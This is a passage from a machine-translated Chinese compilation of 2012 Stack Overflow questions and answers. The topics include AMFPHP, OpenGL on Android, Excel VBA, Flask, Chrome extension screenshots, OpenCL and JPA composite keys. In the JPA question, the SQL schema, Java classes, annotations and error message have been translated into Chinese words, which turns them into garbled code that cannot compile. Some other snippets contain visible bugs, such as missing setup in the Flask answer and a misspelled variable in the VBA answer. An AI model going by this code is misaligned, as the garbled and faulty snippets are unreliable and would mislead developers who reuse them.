    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
    at java.lang.reflect.Method.invoke(Method.java:597)
    at org.eclipse.equinox.launcher.Main.invokeFramework(Main.java:622)
    at org.eclipse.equinox.launcher.Main.basicRun(Main.java:577)
    at org.eclipse.equinox.launcher.Main.run(Main.java:1410) 
```

# php - Flex Datagrid 选择多行并发送到 amfphp 后端

> ID：13548488
> 
> 赞同：1
> 
> 时间：2012-11-25T05:10:22.123
> 
> 标签：php, actionscript-3, apache-flex, datagrid, amfphp

我正在互联网上的论坛上研究一些解决方案以向 AmfPHP 发送和 ArrayCollection，但我没有找到好的响应，以及如何访问 PHP 端的数组以包含到 MySQL 表中。

我的问题：

我有一个填充了一些名称和电子邮件的 Flex 数据网格，我想创建一种方法来允许用户创建一个组并选择名称作为该组的一部分。我在 Flash Builder 调试器中看到数据以 ArrayCollection 的形式发送（也从 Vector 转换为 Object），而问题仍然在于如何在 PHP 端访问该数组。

这是发送到 AmfPHP 的 ArrayCollection：

```
[0] Object (@cf87311)   
[1] Object (@d4bfcb9)   
[2] Object (@d4d3479) 
```

这是数组的键和值：

```
[0] Object (@cf87311)   
    id  "2" 
    nome    "David" 
    username    "david" 
[1] Object (@d4bfcb9)   
    id  "3" 
    nome    "jose"  
    username    "jose@jose.com" 
[2] Object (@d4d3479)   
    id  "4" 
    nome    "joao"
    username    "joao@joao.com" 
```

有谁知道我必须做什么才能访问此数组中的“id”字段？

此致 ！

拉斐尔·塔瓦雷斯

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T16:25:45.550

AMFPHP will translate your actionscript object into a PHP object. Pass the arraycollection as one param. On the PHP side you would use it as:

```
function myfunction( $Object_param )
{
   foreach( $Object_param as $Object )
   {
       echo $Object[ 'id' ];
       echo $Object[ 'nome' ];
   }
} 
```

and so on.

# c++ - 在崩溃时记录调用堆栈

> ID：13548491
> 
> 赞同：0
> 
> 时间：2012-11-25T05:10:59.033
> 
> 标签：c++

> **可能重复：**
> [C++ 显示异常时的堆栈跟踪](https://stackoverflow.com/questions/691719/c-display-stack-trace-on-exception)

如何使用调用堆栈记录崩溃异常？可能吗？可以给出任何简短的例子，或者至少设定正确的方向吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:20:22.483

[StackWalker](http://www.codeproject.com/Articles/11132/Walking-the-callstack)库可以帮助打印窗口的调用堆栈。 [这个](https://stackoverflow.com/questions/691719/c-display-stack-trace-on-exception)SO答案有更多细节

# java - Android OpenGL 2D旋转根本不起作用

> ID：13548493
> 
> 赞同：0
> 
> 时间：2012-11-25T05:11:06.493
> 
> 标签：java, android, opengl-es

我正在尝试开始一个简单的 2d openGL 游戏。我在旋转时遇到了麻烦。旋转和平移似乎都不起作用。我根本没有得到任何结果。在下面的示例中，我尝试在屏幕中央旋转一个 50x50 的小方块。

* * *

```
public void onSurfaceCreated(GL10 gl10, EGLConfig eglConfig) {
    gl10.glEnable(GL10.GL_TEXTURE_2D);

    gl10.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);

    textures = new int[1];

    // LOAD TEXTURE
    Bitmap bitmap = BitmapFactory.decodeResource(mContext.getResources(), R.drawable.grass);

    gl10.glGenTextures(1, textures, 0);
    gl10.glBindTexture(GL10.GL_TEXTURE_2D, textures[0]);

    gl10.glTexParameterf(GL10.GL_TEXTURE_2D, GL10.GL_TEXTURE_MIN_FILTER, GL10.GL_NEAREST);
    gl10.glTexParameterf(GL10.GL_TEXTURE_2D, GL10.GL_TEXTURE_MAG_FILTER, GL10.GL_LINEAR);

    mCrop = new int[4];
    mCrop[0] = 0;
    mCrop[1] = bitmap.getHeight();
    mCrop[2] = bitmap.getWidth();
    mCrop[3] = -bitmap.getHeight();

    GLUtils.texImage2D(GL10.GL_TEXTURE_2D, 0, bitmap, 0);

    bitmap.recycle();
}

 public void onDrawFrame(GL10 gl) {
        gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);
        gl.glShadeModel(GL10.GL_FLAT);
        gl.glEnable(GL10.GL_BLEND);
        gl.glBlendFunc(GL10.GL_ONE, GL10.GL_ONE_MINUS_SRC_ALPHA);
        gl.glColor4x(0x10000, 0x10000, 0x10000, 0x10000);

        gl.glMatrixMode(GL10.GL_PROJECTION);
        gl.glLoadIdentity();

        gl.glOrthof(0.0f, sWidth, 0.0f, sHeight, 0.0f, 1.0f);

        gl.glMatrixMode(GL10.GL_MODELVIEW);

        gl.glEnable(GL10.GL_TEXTURE_2D);

        gl.glBindTexture(GL10.GL_TEXTURE_2D, textures[0]);
        ((GL11)gl).glTexParameteriv(GL10.GL_TEXTURE_2D, GL11Ext.GL_TEXTURE_CROP_RECT_OES, mCrop, 0);

        gl.glPushMatrix();
        gl.glRotatef(anglefromcenter, 0, 1, 0);
        ((GL11Ext)gl).glDrawTexfOES(sWidth/2, sHeight/2, 0, 50, 50);
        gl.glPopMatrix();

    ... 
```

* * *

任何帮助将非常感激。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T07:19:43.997

首先，我不确定“glDrawTexfOES”是否可以与任何矩阵一起使用。至于“glRotatef”，您所做的似乎只会围绕 X 缩放图像，就好像 glScalef(sin(anglefromcenter), 1.0, 1.0)。另请注意， glRotatef 的角度以度为单位。

# excel - 在 VBA 中合并列

> ID：13548495
> 
> 赞同：0
> 
> 时间：2012-11-25T05:11:19.660
> 
> 标签：excel, merge, multiple-columns, vba

我需要处理我每天以下列方式获得的文件。

```
C1  C2          C3
618 970000000000    32
    970000000000    32

58  970000000000    23
    970000000000    23
    970000000000    23

15  970000000000    119
    970000000000    119
    970000000000    119
    970000000000    119

15  970000000000    17
    970000000000    17 
```

我需要根据 C1 的合并来合并 C3 中的单元格。请注意，C1 已经合并。我希望它看起来像下面

```
 C1  C2          C3
618 970000000000    32
    970000000000    

58  970000000000    23
    970000000000    
    970000000000    

15  970000000000    119
    970000000000    
    970000000000    
    970000000000    

15  970000000000    17
    970000000000 
```

是否可以在 VBA 中编写代码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T10:35:51.340

假设您的数据在 A 到 C 列中，您可以使用以下代码：

```
Sub MergeMyCells()
firstRrow = 1
Range("C1").Select
lastRow = Cells.Find("*", SearchOrder:=xlByRows, SearchDirection:=xlPrevious).Row
Cells(lastRow, 3).Select
For i = firstRow To lastRow
  Cells(i, 3).Select
  If (Not (ActiveCell.Offset(0, -2).Value > 0)) Then
    ActiveCell.Value = ""
  End If
Next
End Sub 
```

# javascript - 将数据从 Python 返回到 Javascript

> ID：13548496
> 
> 赞同：4
> 
> 时间：2012-11-25T05:11:22.890
> 
> 标签：javascript, python, return

我有一个 Python 脚本，可以打印并返回服务器文件夹中的所有图像文件。

```
import os
images = ""
for dirname, dirnames, filenames in os.walk('..\directory'):
    for filename in filenames:
        images = images + os.path.join(dirname, filename) + "^"
print(images)
return images 
```

我使用 Javascript 调用它：

```
$.get("scripts/filename.py", function(data){
  alert(data);
}); 
```

但是，它只是显示来自 filename.py 的代码，而不是获取“打印”或返回的数据。我在这里错过了什么吗？

编辑：顺便说一句，我正在使用 Google App Engine 来托管我的网站。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T05:38:36.550

您需要一些 Web 框架设置，例如[Flask](http://flask.pocoo.org/)或[cherrypy](http://www.cherrypy.org/)。我建议使用 Flask，它是最容易上手的 Web 框架。

然后您需要有一些可以向其发送`AJAX GET`请求的端点，然后您的 Python 脚本将返回 JSON 响应。您可以遍历此 JSON 响应以打印出结果。

此代码可能适合您：

```
import sys, os
from flask import Flask, request, url_for, render_template

@app.route('/images')
def index():
    images = ""
    for dirname, dirnames, filenames in os.walk('..\directory'):
        for filename in filenames:
            images = images + os.path.join(dirname, filename) + "^"
    print(images)
    # return a json encoded response
    return Response(json.dumps(images, sort_keys=True, indent=4), mimetype='application/json')

if __name__ == '__main__':
    # Bind to PORT if defined, otherwise default to 5000.
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port) 
```

现在您需要启动服务器，每当您发送 GET 请求时，`localhost:5000/images`它都会返回您正在寻找的 JSON 响应。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T05:13:56.397

您是否设置了 Python 以在您的服务器上运行？

*   [将 Apache Web 服务器配置为在 Windows 上运行 Python](http://www.editrocket.com/articles/python_apache_windows.html)或

*   [如何配置 Apache 以在 Windows 上运行 Python](http://ujjaini.wordpress.com/2010/08/13/how-to-run-python-script-on-apache-on-windows/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-03-09T13:19:31.050

只需将 Phyton 脚本放在 cgi 文件夹中

# android - Android项目编译windows的时间太长

> ID：13548502
> 
> 赞同：1
> 
> 时间：2012-11-25T05:12:36.990
> 
> 标签：android, eclipse

我试图为具有大量源代码的平板电脑运行 android 项目，例如大约 35 MB 以上的可绘制对象。编译需要将近 5 到 10 分钟，而当我启动 Eclipse 时，又需要 5-10 分钟。任何人都可以帮助解决这个问题。我有 Windows，i5，配置了 12 GB 内存。仍然花费了如此巨大的时间。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:17:07.457

尝试从`Eclipse`分配为的额外内存开始：

```
 eclipse -vmargs -Xms512m -Xmx1024m 
```

如果您使用的是 Eclipse 快捷方式，则可以通过快捷方式属性更新参数。

此处的详细信息：[使用内存参数运行 Eclipse](http://help.eclipse.org/indigo/index.jsp?topic=%2Forg.eclipse.platform.doc.user%2Ftasks%2Frunning_eclipse.htm)

# javascript - 滚动元素与手指移动的像素数完全相同（ios 样式库）

> ID：13548503
> 
> 赞同：1
> 
> 时间：2012-11-25T05:12:43.903
> 
> 标签：javascript, jquery, touch

```
var maxTime = 100000, // allow movement if < 1000 ms (1 sec)
maxDistance = 50,  // swipe movement of 50 pixels triggers the swipe
target = $('#gallery ul'),
startX = 0,
startTime = 0,
touch = "ontouchend" in document,
startEvent = (touch) ? 'touchstart' : 'mousedown',
moveEvent = (touch) ? 'touchmove' : 'mousemove',
endEvent = (touch) ? 'touchend' : 'mouseup';
target.bind(startEvent, function(e){
  e.preventDefault();
  // prevent image drag (Firefox)
  startTime = e.timeStamp;
  startX = e.originalEvent.touches ? e.originalEvent.touches[0].pageX : e.pageX;
}).bind(moveEvent, function(e){
  e.preventDefault();
  var currentX = e.originalEvent.touches ? e.originalEvent.touches[0].pageX : e.pageX,
    currentDistance = (startX === 0) ? 0 : Math.abs(currentX - startX),
    // allow if movement < 1 sec
  currentTime = e.timeStamp;
  if (startTime !== 0 && currentTime - startTime < maxTime && currentDistance > maxDistance) {
    if (currentX < startX) {
      galleryNext();
    }
    if (currentX > startX) {
      galleryPrev();
    }
    startTime = 0;
    startX = 0;
  }
}).bind(endEvent, function(e){
  startTime = 0;
  startX = 0;
}); 
```

这是我修改的脚本，以便它运行函数以切换到滚动元素中的下一个图像。我需要它做的是像 iPhone 画廊一样操作，当我移动它时，元素会随着我的手指滚动，并且在释放时要么转到下一张图像，要么在 touchend 事件中将当前图像带回视图。我尝试在事件之间切换功能并删除 preventDefault 以允许自然滚动，然后尝试应用这些功能，但这允许元素像往常一样连续滚动，这不是我想要的。

有谁能帮忙吗？提前致谢。

# google-chrome - 在 chrome 扩展中捕获元素图像（缩放失败）

> ID：13548510
> 
> 赞同：4
> 
> 时间：2012-11-25T05:14:22.367
> 
> 标签：google-chrome, google-chrome-extension, screenshot, zooming

我正在尝试获取 chrome 扩展中特定元素的图像/屏幕截图，我遇到的问题是，当我从`chrome.tabs.captureVisibleTab`结果图像中裁剪结果时，如果页面放大/缩小（通过`View -> Zoom In`）。

特别的问题是，由于页面被缩放，我从内容脚本获得的偏移量/大小没有按比例放大/缩小，所以我最终裁剪了屏幕截图的错误区域

有没有办法获取/设置标签当前缩放级别？或者检测正确的元素大小/位置？

我在谷歌上找到的所有东西都指向不，但是很棒的截图让这项工作以某种方式起作用

背景.js：

```
chrome.tabs.captureVisibleTab(tab.windowId, { format: "png" }, function(dataUrl) {
            console.log('got capture');
            if (!canvas) {
                canvas = document.createElement("canvas");
                document.body.appendChild(canvas);
                console.log('created canvas');
            }
            var image = new Image();
            image.onload = function() {
                console.log('image loaded, cropping');
                canvas.width = dimensions.width;
                canvas.height = dimensions.height;
                var context = canvas.getContext("2d");
                context.drawImage(image,
                    dimensions.left, dimensions.top,
                    dimensions.width, dimensions.height,
                    0, 0,
                    dimensions.width, dimensions.height
                );
                console.log('image created');
                var croppedDataUrl = canvas.toDataURL("image/png");
                chrome.tabs.create({
                    url: croppedDataUrl,
                    windowId: tab.windowId
                });
            }
            image.src = dataUrl;
        }); 
```

内容脚本：

```
console.log('getting dimensions')
                var dimensions = {
                    top: -window.scrollY + $(element).offset().top,
                    left: -window.scrollX + $(element).offset().left,
                    width: $(element).width(),
                    height: $(element).height()
                };
                console.log('sending dimensions', dimensions);
                sendResponse(dimensions); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T17:04:59.297

我在这里尝试了一个示例扩展，它也与放大和缩小完美配合。它**总是** `captured visible Tab`完美的。如果您正在考虑调整缩放级别，您可以尝试`document.body.style.zoom = "Your_value%";`但是您需要将此代码通过`content script`以使其运行`chrome extensions`

有效的示例代码

***清单.json***

```
{
  "name": "Screen Shot",
  "version": "1.0",
  "manifest_version": 2,
  "description": "This will generate Screen Shot of current Chrome Page",
  "browser_action": {
    "default_icon": "screen.png",
    "default_popup": "script.html"
  },
  "permissions": [
    "tabs","<all_urls>"
  ],
  "icons":{"16":"screen.png","48":"screen.png","128":"screen.png"}
} 
```

***脚本.html***

```
<html>
<head>
<script src="button.js"></script>
</head>
<style>
body{
margin:0px;
width:0px;
height:0px;
border:0px;
}
</style>
<body>
</body>
</html> 
```

***按钮.js***

```
function screenshot() {
chrome.tabs.captureVisibleTab(null,{format:"jpeg",quality:100},function(dataUrl){
    window.open(dataUrl);
});
}
screenshot(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-08T18:43:30.850

我相信您可以使用 Range Object 和 Range.getBoundingClientRect() 来适当地考虑缩放。

```
console.log('getting dimensions')
var r=new Range();//could be done elsewhere reuse
r.selectNode(element);
var dimensions = r.getBoundingClientRect();
console.log('sending dimensions', dimensions);
sendResponse(dimensions); 
```

您可能必须将尺寸复制到基本 js 对象才能正确发送。

另一种选择是使用 chrome.tabs.getZoom 来调整尺寸。

# opencl - OpenCL 内存缓冲区传输提供不正确的数据

> ID：13548511
> 
> 赞同：4
> 
> 时间：2012-11-25T05:14:46.137
> 
> 标签：opencl

我是 openCL 的新手，我正在尝试从一个非常简单的内核开始。现在我只是试图将数据传输到内核并返回，这样我就可以验证是否设置了正确的数据。但是，我的行为很奇怪。这是我的主机代码：

```
string PROGRAM_FILE = "C:\\Projects\\AnimatLabSDK\\OpenNeuronCL\\Libraries\\OpenNeuronCL\\Kernels\\FastSpikingNeuron.cl";
string KERNEL_FUNC = "FastSpikingNeuron";

std::vector<cl::Platform> platforms;
std::vector<cl::Device> devices;  
int i;

// Data
cl::NDRange ndGlobal(DATA_SIZE);  
cl::NDRange ndLocal(LOCAL_SIZE);

cl_float aryVmIn[DATA_SIZE], aryVmOut[DATA_SIZE];
cl_float aryVahp[DATA_SIZE], aryTestOut[DATA_SIZE];

try {
  // Initialize data
  for(i=0; i<DATA_SIZE; i++) {
     aryVmIn[i] = i*0.1f; //0.0f;
     aryVahp[i] = i*0.1f; //0.0f;
  }

  // Place the GPU devices of the first platform into a context
  cl::Platform::get(&platforms);
  platforms[0].getDevices(CL_DEVICE_TYPE_GPU, &devices);
  cl::Context context(devices);

  // Create kernel
  std::ifstream programFile(PROGRAM_FILE);
  std::string programString(std::istreambuf_iterator<char>(programFile),
        (std::istreambuf_iterator<char>()));
  cl::Program::Sources source(1, std::make_pair(programString.c_str(),
        programString.length()+1));
  cl::Program program(context, source);

  //std::cout << "Program kernel: " << std::endl << programString << std::endl;

  try
  {
    program.build(devices);
  }
  catch(cl::Error e)
  {
      std::cout << e.what() << ": Error code " << e.err() << std::endl;   
      string buildlog;
      program.getBuildInfo( devices[0], (cl_program_build_info)CL_PROGRAM_BUILD_LOG, &buildlog );
      std::cout << "Error: " << buildlog << std::endl;   
      throw e;
  }

  cl::Kernel kernel(program, KERNEL_FUNC.c_str());

  // Create buffers
  cl::Buffer bufferVmIn(context, CL_MEM_READ_ONLY | CL_MEM_USE_HOST_PTR, sizeof(aryVmIn), aryVmIn);
  cl::Buffer bufferVmOut(context, CL_MEM_WRITE_ONLY, sizeof(aryVmOut), NULL);
  cl::Buffer bufferVahp(context, CL_MEM_READ_ONLY | CL_MEM_USE_HOST_PTR, sizeof(aryVahp), aryVahp);
  cl::Buffer bufferTestOut(context, CL_MEM_WRITE_ONLY, sizeof(aryTestOut), NULL);

  // Set kernel arguments
  kernel.setArg(0, bufferVmIn);
  kernel.setArg(1, bufferVmOut);
  kernel.setArg(2, bufferVahp);
  kernel.setArg(3, bufferTestOut);

  // Create queue and enqueue kernel-execution command
  cl::CommandQueue queue(context, devices[0]);

  queue.enqueueWriteBuffer(bufferVmIn, CL_TRUE, 0, sizeof(aryVmIn),  aryVmIn, NULL, NULL);
  queue.enqueueWriteBuffer(bufferVahp, CL_TRUE, 0, sizeof(aryVahp),  aryVahp, NULL, NULL);

  queue.enqueueNDRangeKernel(kernel, NULL, ndGlobal, ndLocal);

  queue.enqueueReadBuffer(bufferVmOut, CL_TRUE, 0, sizeof(aryVmOut),  aryVmOut, NULL, NULL);
  queue.enqueueReadBuffer(bufferTestOut, CL_TRUE, 0, sizeof(aryTestOut),  aryTestOut, NULL, NULL);

  // Display updated buffer
  for(i=0; i<10; i++) 
  {
      printf("%6.5f, %6.5f", aryVmOut[i], aryTestOut[i]);
      printf("\n");
  }  
}
catch(cl::Error e) 
{
  std::cout << e.what() << ": Error code " << e.err() << std::endl;   
} 
```

这是我的内核：

```
__kernel void FastSpikingNeuron(__global float *aryVmIn, __global float *aryVmOut, __global float *aryVahp, __global float *aryTestOut)
{
int gid = get_global_id(0);
local float fltVahp;

fltVahp = aryVahp[gid];

aryVmOut[gid] = fltVahp;
aryTestOut[gid] = fltVahp;
} 
```

我只是设置一些数据，然后尝试读出 Vmout 和 TestOut，然后查看它们的一些内容。当我运行这个应用程序时，我得到以下输出：

```
0.00000, 0.90000
0.10000, 0.90000
0.20000, 0.90000
0.30000, 0.90000
0.40000, 0.90000
0.50000, 0.90000
0.60000, 0.90000
0.70000, 0.90000
0.80000, 0.90000
0.90000, 0.90000 
```

到目前为止，这对我来说没有任何意义。在内核中，我将 VmOut 和 TestOut 都设置为完全相同的变量，但是当我将它读回主机时，我得到了不同的结果。我在这里做错了什么，但我还没有弄清楚它是什么。非常感谢在 opencl 方面更有经验的人提供的任何帮助。

谢谢大卫

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T14:55:01.947

您的内核中存在竞争条件，这是由于多个工作项将不同的值存储到同一内存位置而引起的，这就是您得到奇怪结果的原因。

提醒——`local`地址空间的定义是：

> __local 或本地地址空间名称用于描述需要在本地内存中分配**并由工作组的所有工作项共享的**变量。

如果您希望每个工作项具有不同的值，只需省略`local`修饰符即可。

# java - JPA : OpenJPA : type 指定的id类与该类的主键字段不匹配

> ID：13548515
> 
> 赞同：3
> 
> 时间：2012-11-25T05:15:58.610
> 
> 标签：java, hibernate, jpa, persistence

我已经包含了在将 JPA 类构建到显示的表模式时遇到的错误......任何人都可以指导我如何解决这个错误。以及当其中一个键实际上是外键时如何制作复合键。我的注释有什么问题？

**错误**

```
org.apache.openjpa.util.MetaDataException：类型“class Specialty”指定的id类与类的主键字段不匹配。
确保您的身份类具有与持久类型相同的主键，包括 pk 字段类型。不匹配的属性：“personId”

```

**表架构**

```
创建表位置（
  id int 主键，
  城市 varchar(255),
  状态 varchar(100)，
  国家 varchar(255)
);
创建表人（
  id int 主键，
  名称 varchar(100)
);
创建表摄影师（
  id int 主键在删除级联上更新级联上引用 Person(id)，
  liveIn int not null 引用 Location(id) on update cascade on delete no action
);
创建表专业（
  摄影师 int 在删除级联上更新级联时引用摄影师（id），
  类型枚举（'肖像'，'风景'，'运动'），
  主键（摄影师，类型）
);
创建表照片（
  id int 主键，
  takeAt 时间戳不为空，
  takeBy int 在删除时更新级联引用摄影师（id）无操作，
  photosedAt int 引用 Location(id) 更新级联删除无操作，
  类型枚举（'肖像'，'风景'，'运动'）
);
创建表外观（
  在删除级联上显示更新级联上的 int 引用 Person(id)，
  isShownIn int 在删除级联上更新级联上引用照片（id），
  主键（显示，isShownIn）
);

```

**课程**

**人.java**

```
@实体
公共类人实现可序列化{

    @ID
    @GeneratedValue（策略 = GenerationType.IDENTITY）
    私人 int id；

    私有字符串名称；

```

**位置.java**

```
@实体
公共类位置实现可序列化{

    @ID
    @GeneratedValue（策略 = GenerationType.IDENTITY）
    私人 int id；

    私人字符串城市；

    私有字符串状态；

    私有字符串国家；

```

**摄影师.java**

```
@实体
公共类摄影师实现可序列化{

    @ID
    @ManyToOne
    @Column(name = "id")
    私人人personId；

    @ManyToOne
    @Column(name = "livesIn")
    私人位置住在;

```

**照片.java**

```
@实体
公共类照片实现可序列化{

    @ID
    @Column(name = "id")
    @GeneratedValue（策略 = GenerationType.IDENTITY）
    私人 int id；

    // 外键
    @ManyToOne
    @JoinColumn(name = "takenBy")
    私人摄影师拍摄；

    // 外键
    @ManyToOne
    @JoinColumn(name = "photographedAt")
    私人拍摄地点；

    @基本（可选=假）
    @Column（名称=“takenAt”，可插入=假，可更新=假）
    @Temporal(TemporalType.DATE)
    私人拍摄日期；

    @Enumerated(EnumType.STRING)
    私有 PhotoType 类型；

```

**照片类型**

```

公共枚举 PhotoType {
    肖像（“肖像”），风景（“风景”），运动（“运动”）；
    私有字符串类型；

    PhotoType（字符串类型）{
        this.type = 类型；
    }

    公共字符串 getType() {
        返回类型；
    }

}

```

**专业.java**

```

导入 java.io.Serializable；

导入 javax.persistence.Column；
导入 javax.persistence.Embeddable；
导入 javax.persistence.EmbeddedId；
导入 javax.persistence.Entity；
导入 javax.persistence.EnumType;
导入 javax.persistence.Enumerated;
导入 javax.persistence.Id；
导入 javax.persistence.JoinColumn；
导入 javax.persistence.ManyToOne；
导入 javax.persistence.OneToMany；
导入 javax.persistence.OneToOne；

@实体
公共类专业实现可序列化{

    @EmbeddedId
    受保护的SpecialtyPK专业PK；

    公共专业（）{
        极好的（）;
    }

    公共专业（SpecialtyPK specialPK）{
        极好的（）;
        this.specialtyPK = 专业PK；
    }

}

@可嵌入
类 SpecialtyPK 实现可序列化 {

    @ManyToOne
    @Column(name = "id")
    私人摄影师 personId；

    @Enumerated(EnumType.STRING)
    私有 PhotoType 类型；

    /*
     *（非 Javadoc）
     *
     * @see java.lang.Object#hashCode()
     */
    @覆盖
    公共 int hashCode() {
        最终 int 素数 = 31；
        整数结果 = 1;
        结果 = 素数 * 结果
                + ((personId == null) ? 0 : personId.hashCode());
        结果 = 素数 * 结果 + ((type == null) ? 0 : type.hashCode());
        返回结果；
    }

    /*
     *（非 Javadoc）
     *
     * @see java.lang.Object#equals(java.lang.Object)
     */
    @覆盖
    公共布尔等于（对象 obj）{
        如果（这 == 对象）
            返回真；
        如果（obj == null）
            返回假；
        if (getClass() != obj.getClass())
            返回假；
        SpecialtyPK 其他 = (SpecialtyPK) obj;
        if (personId == null) {
            if (other.personId != null)
                返回假；
        } else if (!personId.equals(other.personId))
            返回假；
        如果（类型！= other.type）
            返回假；
        返回真；
    }

    公共专业PK（）{
        极好的（）;
        // TODO 自动生成的构造函数存根
    }

    public SpecialtyPK(Photographer personId, PhotoType type) {
        极好的（）;
        this.personId = personId;
        this.type = 类型；
    }

}

```

尝试使用复合键也失败并给出了同样的错误。

很多互联网搜索还没有找到任何解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T05:21:49.300

在我看来，您有一个[复合主键](http://www.objectdb.com/java/jpa/entity/id#Composite_Primary_Key_)，但您通过注释告诉 JPA，您有一个[嵌入的主键](http://www.objectdb.com/java/jpa/entity/id#Embedded_Primary_Key_)。就像我告诉每个第一次参加项目的人一样：

> 首先让最简单的事情开始工作，而不考虑效率并根据客户需求进行优化。

过早的优化是多软件问题的根源。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T15:52:01.817

问题是2倍。一个问题是 SpecialtyPK 中的 personId 映射。@Column 用于基本映射；您需要使用 @JoinColumn 注释指定用于连接的列。

第二个也是更重要的是，主键类不应该包含关系——它是否可嵌入定义为主键类并不重要，它应该只包含基本映射或其他主键（在 JPA 2.0 中允许派生 ID，这意味着可以嵌套关键类）。因此，您将需要一个具有“int”类型的 personId 的 SpecialtyPK 类。然后，您可以在 Specialty 中指定一个 ManyToOne 映射并添加 @MapsId 以将其指向 int，这样您只需要设置关系而不需要管理可嵌入对象中的基本映射。

```
@Entity
public class Specialty implements Serializable {

    @EmbeddedId
    protected SpecialtyPK specialtyPK;

    @MapsId("personId")
    protected Photographer photographer;
..

class SpecialtyPK implements Serializable {

    @Column(name = "id")
    private int personId;//defaults to basic

.. 
```

或者您可以删除 embeddedId 并将摄影师标记为 id。

# php - Eclipse 弃用代码高亮 php

> ID：13548522
> 
> 赞同：1
> 
> 时间：2012-11-25T05:16:54.190
> 
> 标签：php, eclipse, syntax-highlighting, deprecated

我有两台安装了相同 Eclipse 的不同电脑。一个向我展示了作为删除线的弃用函数，即~~foo()~~。但是，在我的另一台电脑上，这似乎不起作用。我尝试更改首选项无济于事。我还注意到，当我通过按住`ctrl`并单击函数（在本例中`ereg_replace()`）来显示函数定义时，没有`@deprecated`线条或任何东西。我错过了什么吗？

我也在两台电脑上使用 EclipseColorTheme 插件；不确定这是否会影响它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-08-07T03:27:42.480

我知道这是一个旧线程，但万一其他人遇到这个：

首选项-> PHP-> 编辑器-> 语法着色。选择已弃用的成员。选择启用。它将允许您格式化突出显示（删除线）。

# java - 请帮我调用打印方法

> ID：13548529
> 
> 赞同：0
> 
> 时间：2012-11-25T05:17:39.363
> 
> 标签：java, class, methods, call

我创建了一种打印文件的方法，但是它只传递真实值而不是**.dat**文件中的实际值。请你看看我的方法并告诉我我做错了什么吗？非常感谢。

调用打印方法：

```
System.out.println(printColumnHeaders(vehicles[x], false, false)); 
```

我的打印方法：

```
private  static  boolean  printColumnHeaders(Vehicle vehicle,boolean isFirst,boolean printFull ) {

    if(isFirst && printFull) {
         System.out.println(vehicle.printFullHeadings());
         isFirst = true;
         printFull = true;
     }
     else  if(isFirst){
         System.out.println(vehicle.printSummaryHeadings());
         isFirst = true;
     }
    return false; 
    } 
```

该方法假设检查 isFirst 布尔值是否为真且 printFull 布尔值为真，然后调用车辆的 printFullHeadings 方法，否则如果 isFirst 布尔值最后为真，则调用车辆的 printSummaryHeadings 方法

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T18:31:27.793

如前所述，由于您传入的是 false，因此 false 您的方法不会打印。但是你似乎也有一个逻辑问题，因为你的静态方法总是返回一个布尔值，你正在传递给 System.out.println。您可以尝试以下方法：

`if ( printColumnHeaders(System.out, vehicles[x], false, false) == false)
... handle print error`

您的打印方法是：

`private static boolean printColumnHeaders(java.io.PrintStream writer, Vehicle vehicle,boolean isFirst,boolean printFull ) {`

 ````
if(isFirst && printFull) {
     writer.println(vehicle.printFullHeadings());
     isFirst = true;
     printFull = true;
 }
 else  if(isFirst){
     writer.println(vehicle.printSummaryHeadings());
     isFirst = true;
 }
return false; 
} 
````  `这允许您的方法输出到不仅仅是标准输出。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T06:08:44.863

```
System.out.println(printColumnHeaders(vehicles[x], false, false)); 
```

您将 false、false 传递给 printColumnHeaders 方法，这只会导致它终止并返回 false，它通过调用 System.out.println() 来打印。

如果您调用一个方法作为 println() 的参数，它将打印该方法的返回值，而不是您希望在该方法中打印的任何内容。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T20:49:35.287

这是我修复它的方法：

```
private static void displayVehicleData(String displayType) {
    boolean isFirst = true;

    for(int x = 0; x < vehicles.length; x++){

        switch(displayType) {

            case "Vehicles" : // List All Vehicles
                isFirst = printColumnHeaders(vehicles[x], false, isFirst);
                    System.out.println(vehicles[x].printSummaryOutput());

                break;
            case "Cars": // List All Cars
                    if(vehicles[x].getVehicleType().equals("American Car") || 
                        vehicles[x].getVehicleType().equals("Foreign Car")) {
                        isFirst = printColumnHeaders(vehicles[x], false, isFirst);
                        System.out.println(vehicles[x].printSummaryOutput());
                    } 
```

印刷方式：

```
private  static  boolean  printColumnHeaders(Vehicle vehicle, boolean printFull, boolean isFirst) {

                if(isFirst && printFull){
                    System.out.println(vehicle.printFullHeadings());
                }                                       
                else if (isFirst){
                    System.out.println(vehicle.printSummaryHeadings());
                }

            return false;
        } 
````

# php - PHP中网页的英语到阿拉伯语翻译

> ID：13548530
> 
> 赞同：0
> 
> 时间：2012-11-25T05:17:50.547
> 
> 标签：php, mysql, language-translation

我有一个非常简单的问题，在这里我需要帮助。我正在使用 PHP 和 MySQL 开发一个网站，通过 Ajax 请求和响应。在我的 index.php 页面上，所有数据都显示在表 A 中，使用非常简单的查询“select * from A”我的页面已成功生成。我现在想要的是一个库或内置功能，可以将 index.php 的文本转换为阿拉伯语。我希望所有网站都使用这个，但想从一页开始。我希望阿拉伯语用户可以使用我的网站:)

